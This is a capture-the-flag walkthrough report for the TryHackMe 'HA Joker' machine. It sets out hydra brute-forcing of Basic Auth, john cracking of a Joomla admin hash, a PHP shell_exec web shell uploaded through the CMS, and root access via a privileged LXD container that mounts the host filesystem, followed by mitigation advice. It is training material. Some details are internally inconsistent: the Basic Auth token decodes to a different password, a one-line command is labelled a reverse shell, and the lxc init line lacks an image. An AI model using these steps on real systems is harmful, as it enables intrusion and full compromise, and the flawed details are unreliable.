# 🟩HA Joker - Try Hack Me (THM) Walkthrough Report  

**Prepared by:** Nishanth Antony  
**Date:** August 18, 2025  
**Difficulty:** Medium  
**Category:** Web Exploitation / Privilege Escalation  
**Platform:** TryHackMe (THM)  

---

## 1. Reconnaissance Steps

- **Objective:** Identify open ports, services, and potential vulnerabilities.
- **Commands Used:**  
  ```bash
  nmap -A <target_ip>
  ```
- **Findings:**
  - Open ports: HTTP (80, unauthenticated), HTTP (8080, Basic Authentication), SSH (22).
  - Apache version: 2.4.29.
  - Port 80 revealed files: `secret.txt` (conversation with user `joker`) and `phpinfo.php` (backend information).
  - Port 8080 required Basic Authentication.

---

## 2. Exploitation Process

### Step 1 – Web Enumeration (Port 80)
- Identified files on port 80: `secret.txt` and `phpinfo.php`.
- `secret.txt` contained a conversation referencing user `joker`.
- `phpinfo.php` exposed server configuration details.

### Step 2 – Brute-Forcing Basic Authentication (Port 8080)
- Used `hydra` to brute-force credentials for `joker` on port 8080:
  ```bash
  hydra -l joker -P /usr/share/wordlists/rockyou.txt <target_ip> -s 8080 http-get /
  ```
- **Result:** Obtained password `hannah`.

### Step 3 – CMS Access and Directory Enumeration
- Logged into port 8080 with `joker:hannah` (Basic Auth: `am9rZXI6MTIzNA==`).
- Identified CMS-based blog and enumerated directories:
  - Found `/administrator/` (admin panel).
  - Discovered `backup.zip` (encrypted backup file).

### Step 4 – Backup File Analysis
- Downloaded `backup.zip` and cracked encryption using password `hannah`.
- Extracted database file `joomladb.sql`.
- Searched for user data:
  ```bash
  grep -i "values" joomladb.sql | grep -i super
  ```
- Identified superuser `admin` with hashed password.

### Step 5 – Cracking Admin Password
- Saved hash to `hash.txt`:
  ```text
  $2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG
  ```
- Cracked using `john`:
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  ```
- **Result:** Password `abcd1234`.

### Step 6 – Gaining Shell Access
- Logged into `/administrator/` with `admin:abcd1234`.
- Uploaded a PHP reverse shell:
  ```php
  <?php echo shell_exec("id"); ?>
  ```
- **Result:** Gained shell as `www-data` (member of `lxd` group).

### Step 7 – Privilege Escalation via LXD
- Confirmed `www-data` belonged to `lxd` group, allowing container creation.
- Researched LXD privilege escalation and identified available images.
- Created a privileged container, mounting the host’s root filesystem:
  ```bash
  lxc init priv-container -c security.privileged=true
  lxc config device add priv-container rootfs disk path=/mnt source=/
  lxc start priv-container
  lxc exec priv-container /bin/bash
  ```
- Navigated to `/mnt/root` inside the container to access the host’s `/root`.

### Step 8 – Flag Extraction
- Found `final.txt` in `/root`:
  ```text
  [Contents of final.txt not provided]
  ```

---

## 3. Proof of Concept (PoC)

- **Basic Authentication Brute Force:**  
  ```bash
  hydra -l joker -P /usr/share/wordlists/rockyou.txt <target_ip> -s 8080 http-get /
  ```
  Obtained `joker:hannah`.
- **Password Hash Cracking:**  
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  ```
  Cracked `admin:abcd1234`.
- **Shell Upload:**  
  Uploaded PHP reverse shell to gain `www-data` access.
- **LXD Privilege Escalation:**  
  Mounted host root filesystem in a privileged LXD container to access `/root/final.txt`.

---

## 4. Privilege Escalation

- Exploited `www-data`’s `lxd` group membership to create a privileged container.
- Mounted the host’s root filesystem to gain root-level access.

---

## 5. Mitigation Recommendations

- **Web Server Hardening:**  
  - Remove sensitive files (`secret.txt`, `phpinfo.php`) from public access.
  - Restrict directory access (e.g., `/administrator/`) with authentication.
- **Authentication Security:**  
  - Enforce strong passwords for Basic Authentication and CMS users.
  - Use bcrypt with higher iteration counts for password hashing.
  - Implement multi-factor authentication.
- **Backup File Security:**  
  - Avoid storing backups in publicly accessible directories.
  - Use strong encryption for sensitive files.
- **LXD Hardening:**  
  - Remove untrusted users from the `lxd` group.
  - Disable privileged containers or restrict root filesystem mounting.
- **Patch Management:**  
  - Update Apache (2.4.29 is outdated) and CMS to the latest versions.
  - Monitor logs for unauthorized access attempts.

---

## 6. Lessons Learned

- **Weak Authentication:** Basic Authentication with weak passwords is easily brute-forced.
- **Exposed Files:** Publicly accessible files (`secret.txt`, `phpinfo.php`, `backup.zip`) leak critical information.
- **LXD Misconfiguration:** Membership in the `lxd` group can lead to full system compromise.
- **Backup Security:** Encrypted backups with reused passwords are vulnerable.
- **CMS Vulnerabilities:** Admin access enables shell uploads, escalating to system compromise.

---

## 7. Skills Practiced

- Network and service scanning (`nmap`)
- Web enumeration and file discovery
- Brute-forcing with `hydra`
- Password hash cracking with `john`
- CMS exploitation and reverse shell upload
- LXD-based privilege escalation
- Secure reporting and mitigation strategies
